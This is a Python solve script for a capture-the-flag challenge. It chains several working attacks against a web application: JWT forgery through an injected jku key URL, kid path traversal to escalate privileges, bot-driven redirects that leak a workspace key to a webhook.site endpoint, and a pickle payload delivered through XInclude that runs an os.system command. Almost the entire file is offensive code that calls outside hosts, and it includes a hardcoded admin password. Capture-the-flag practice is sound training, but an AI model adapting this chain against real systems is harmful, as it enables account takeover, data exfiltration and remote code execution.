#!/usr/bin/env python3
"""
Perimeter Drift CTF - Solve Script
Full chain: SSO JWT forge -> Reviewer escalation -> Bot exploit -> Pickle RCE
"""
import base64
import hashlib
import hmac
import json
import os
import pickle
import re
import sys
import time
import urllib.parse

import requests

TARGET = "http://chall.0xfun.org:33382"
WEBHOOK_URL = "https://webhook.site/2e17cadc-41a3-4a6b-805c-aceaef7d539b"
HMAC_KEY = "mysecretkey"

BOT_TARGETS = [
    "http://host.docker.internal:5000",
    "http://host.docker.internal:33382",
    "http://web:5000",
    "http://localhost:5000",
]


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def forge_jwt(key, payload, header_extra=None):
    header = {"alg": "RS256", "typ": "JWT"}
    if header_extra:
        header.update(header_extra)
    h = b64url_encode(json.dumps(header, separators=(',', ':')).encode())
    p = b64url_encode(json.dumps(payload, separators=(',', ':')).encode())
    signing_input = f"{h}.{p}".encode()
    if isinstance(key, bytes):
        sig = hmac.new(key, signing_input, hashlib.sha256).digest()
    else:
        sig = hmac.new(key.encode(), signing_input, hashlib.sha256).digest()
    return f"{h}.{p}.{b64url_encode(sig)}"


def make_pickle_payload():
    class Exploit:
        def __reduce__(self):
            return (os.system, ('cp /flag.txt /shared/loot/flag.txt',))
    return pickle.dumps(Exploit())


def solve():
    s = requests.Session()
    print(f"[*] Target: {TARGET}")

    # Check flag
    r = requests.get(f"{TARGET}/recovery/latest", timeout=10)
    print(f"[*] Recovery: {r.text}")
    if "0xfun{" in r.text:
        print(f"\nFLAG: {r.text}")
        return

    # Try direct admin login
    print("\n[1] Trying direct admin login...")
    s.post(f"{TARGET}/login", data={"username": "olivia.m", "password": "Olivia.Admin-2026!"})
    r = s.get(f"{TARGET}/api/me")
    try:
        me = r.json()
        if me.get("role") == "admin":
            print(f"[+] Admin login worked!")
            r = s.get(f"{TARGET}/admin")
            m = re.search(r'data-workspace-key="([^"]+)"', r.text)
            if m:
                wk = m.group(1)
                print(f"[+] Workspace key: {wk}")
                do_rce(wk)
                return
    except Exception:
        pass

    # SSO JWT forgery
    print("\n[2] SSO JWT Forgery...")
    jwks = json.dumps({"keys": [{"kid": "partner-main", "k": HMAC_KEY}]})
    b64j = base64.b64encode(jwks.encode()).decode()
    jku_url = f"https://httpbin.org/base64/{urllib.parse.quote(b64j, safe='')}"

    now = int(time.time())
    token = forge_jwt(
        HMAC_KEY,
        {"sub": "researcher", "email": "nora.vale@drift.com", "name": "Nora Vale",
         "iss": "https://sso.partner.local", "aud": "perimeter-drift-web",
         "exp": now + 3600, "iat": now},
        {"kid": "partner-main", "jku": jku_url}
    )
    r = s.get(f"{TARGET}/sso/callback", params={"id_token": token})
    print(f"    SSO: {r.status_code} -> {r.url}")

    r = s.get(f"{TARGET}/api/me")
    try:
        me = r.json()
        print(f"    Logged in as: {me}")
    except Exception:
        print(f"    Login failed: {r.text[:200]}")
        return

    # Reviewer escalation
    print("\n[3] Reviewer Escalation (path traversal)...")
    known_key = b"CCCC"
    files = {"file": ("key3.pem", known_key, "application/octet-stream")}
    r = s.post(f"{TARGET}/review/material/upload", files=files)
    print(f"    Upload: {r.text}")
    fname = r.json().get("filename", "key3.pem")
    kid_name = fname.rsplit(".pem", 1)[0] if fname.endswith(".pem") else fname

    grant = forge_jwt(
        known_key,
        {"scope": "report:submit", "iat": now},
        {"kid": f"../review-materials/{kid_name}"}
    )
    r = s.post(f"{TARGET}/review/escalate", data={"grant": grant})
    print(f"    Escalate: {r.status_code}")

    r = s.get(f"{TARGET}/api/me")
    me = r.json()
    print(f"    Role: {me['role']}")

    # Create a report with DOM clobbering payload for XSS chain
    print("\n[4] Creating report with DOM clobbering payload...")
    # Switch session back to researcher to create reports
    # Actually, reviewer can't create reports. Need researcher role.
    # But we escalated to reviewer. Let's try submitting as reviewer via /report endpoint

    # First, let me create a new session as researcher to create the report
    s2 = requests.Session()
    token2 = forge_jwt(
        HMAC_KEY,
        {"sub": "researcher", "email": "nora.vale@drift.com", "name": "Nora Vale",
         "iss": "https://sso.partner.local", "aud": "perimeter-drift-web",
         "exp": now + 3600, "iat": now},
        {"kid": "partner-main", "jku": jku_url}
    )
    s2.get(f"{TARGET}/sso/callback", params={"id_token": token2})

    # Create report with DOM clobbering
    dom_clobber = (
        '<form id="workspace-state">'
        '<input name="state" value=\'{"debug":true,"module":"ops/loader"}\'>'
        '</form>'
    )
    r = s2.post(f"{TARGET}/reports/new", data={
        "title": "Security Assessment",
        "vuln_type": "XSS",
        "report": dom_clobber
    })
    print(f"    Report created: {r.status_code} -> {r.url}")

    # Extract report ID
    report_match = re.search(r'/reports/(\d+)', r.url)
    if not report_match:
        print("    Failed to get report ID")
        # Try getting from reports list
        r = s2.get(f"{TARGET}/reports")
        report_match = re.search(r'/reports/(\d+)', r.text)

    if report_match:
        report_id = report_match.group(1)
        print(f"    Report ID: {report_id}")
    else:
        print("    Could not find report ID")
        return

    # Submit bot URLs - try multiple approaches
    print("\n[5] Submitting URLs to bot...")

    # Approach A: Direct admin bounce to webhook
    for tb in BOT_TARGETS:
        url = f"{tb}/admin?bounce=1&cb={urllib.parse.quote(WEBHOOK_URL, safe='')}"
        print(f"    Submitting: {url[:80]}...")
        r = s.post(f"{TARGET}/report", data={"url": url})
        print(f"    -> {r.status_code}")

    # Approach B: Bot visits report with DOM clobbering that triggers loader->roles->bootstrap
    # This requires the bootstrap ticket. Let's try brute-forcing bt-XXXX (4 hex chars)
    # Actually, let's try the admin bounce + same-origin callback approach
    for tb in BOT_TARGETS:
        report_url = f"{tb}/reports/{report_id}?view=../../js/admin"
        url = f"{tb}/admin?bounce=1&cb={urllib.parse.quote(report_url, safe='')}"
        print(f"    Submitting bounce->report: {url[:100]}...")
        r = s.post(f"{TARGET}/report", data={"url": url})
        print(f"    -> {r.status_code}")

    # Poll webhook for 30 seconds
    print("\n[6] Polling webhook.site for workspace_key...")
    webhook_uuid = WEBHOOK_URL.split("/")[-1]
    wk = None
    for i in range(15):
        time.sleep(2)
        try:
            r = requests.get(f"https://webhook.site/token/{webhook_uuid}/requests", timeout=10)
            if r.status_code == 200:
                data = r.json()
                total = data.get("total", 0)
                if total > 0:
                    print(f"    Got {total} requests!")
                    for req in data.get("data", []):
                        url_str = req.get("url", "")
                        query = req.get("query", {})
                        print(f"    URL: {url_str}")
                        print(f"    Query: {query}")
                        if query.get("workspace_key"):
                            wk = query["workspace_key"]
                            break
                        m = re.search(r'workspace_key=([^&]+)', url_str)
                        if m:
                            wk = urllib.parse.unquote(m.group(1))
                            break
                if wk:
                    break
        except Exception as e:
            print(f"    Poll error: {e}")
        if i % 5 == 4:
            print(f"    Still waiting... ({(i+1)*2}s)")

    if wk:
        print(f"\n[+] Got workspace_key: {wk}")
        do_rce(wk)
    else:
        print("\n[-] No workspace_key received from bot")
        print("[*] Checking if flag appeared anyway...")
        r = requests.get(f"{TARGET}/recovery/latest")
        print(f"    Recovery: {r.text}")


def do_rce(workspace_key):
    print("\n[7] Pickle RCE...")
    pickle_payload = make_pickle_payload()
    b64_payload = base64.b64encode(pickle_payload).decode()

    # Upload
    files = {"file": ("payload.b64", b64_payload, "text/plain")}
    r = requests.post(
        f"{TARGET}/admin/upload",
        files=files,
        headers={"X-Workspace-Key": workspace_key}
    )
    print(f"    Upload: {r.status_code} {r.text}")

    # XML import
    xml = (
        '<doc sink="http://internal:9000/internal/import" '
        'xmlns:drift="http://www.w3.org/2001/XInclude">'
        '<drift:include href="file:///var/app/uploads/payload.b64" parse="text"/>'
        '</doc>'
    )
    r = requests.post(
        f"{TARGET}/admin/xml/import",
        data={"xml": xml},
        headers={"X-Workspace-Key": workspace_key}
    )
    print(f"    XML import: {r.status_code} {r.text}")

    time.sleep(3)
    r = requests.get(f"{TARGET}/recovery/latest")
    print(f"\n{'='*50}")
    print(f"FLAG: {r.text}")
    print(f"{'='*50}")


if __name__ == "__main__":
    solve()
